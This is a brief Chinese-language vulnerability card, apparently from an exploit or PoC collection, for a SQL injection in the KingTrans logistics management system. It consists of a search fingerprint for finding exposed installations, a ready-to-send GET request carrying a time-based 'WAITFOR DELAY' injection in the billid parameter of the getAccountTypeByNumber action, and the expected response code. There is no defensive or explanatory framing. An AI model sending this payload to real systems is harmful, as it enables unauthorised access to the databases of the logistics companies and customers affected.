# 易宇通KingTrans物流管理系统getAccountTypeByNumberSQL注入漏洞

易宇通KingTrans物流管理系统getAccountTypeByNumber ｜ SQL注入 ｜ —
- **指纹**：`body="www.kingtrans.net"`
- **请求**：`GET /WebTrack?action=getAccountTypeByNumber&billid=%27;%20WAITFOR%20DELAY%20%270:0:5%27--%20- HTTP/1.1`
- **响应特征**：200